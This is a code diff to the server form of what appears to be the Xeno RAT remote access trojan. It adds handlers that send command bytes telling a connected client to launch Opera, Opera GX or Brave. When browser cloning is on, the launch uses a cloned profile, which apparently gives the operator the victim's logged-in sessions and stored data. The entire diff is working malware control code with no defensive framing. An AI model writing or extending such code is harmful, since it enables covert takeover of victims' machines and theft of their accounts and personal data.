@@ -154,6 +154,23 @@ namespace xeno_rat_server.Forms
             await client.SendAsync(new byte[] { 10 });
         }
 
+        private async Task StartOpera()
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 11 });
+        }
+
+        private async Task StartOperaGX()
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 12 });
+        }
+
+        private async Task StartBrave()
+        {
+            if (!playing) return;
+            await client.SendAsync(new byte[] { 13 });
+        }
 
         private async Task<Node> CreateImageNode()
         {
@@ -287,6 +304,33 @@ namespace xeno_rat_server.Forms
             else 
             {
                 await DisableBrowserClone();
+            }
+        }
+
+        private async void button12_Click(object sender, EventArgs e)
+        {
+            await StartOpera();
+            if (is_cloning_browser)
+            {
+                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
+            }
+        }
+
+        private async void button11_Click(object sender, EventArgs e)
+        {
+            await StartOperaGX();
+            if (is_cloning_browser)
+            {
+                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
+            }
+        }
+
+        private async void button10_Click(object sender, EventArgs e)
+        {
+            await StartBrave();
+            if (is_cloning_browser)
+            {
+                new Thread(() => MessageBox.Show("It can take a while to clone the profile data, if the browser doesnt launch, please wait...")).Start();
             }
         }
     }
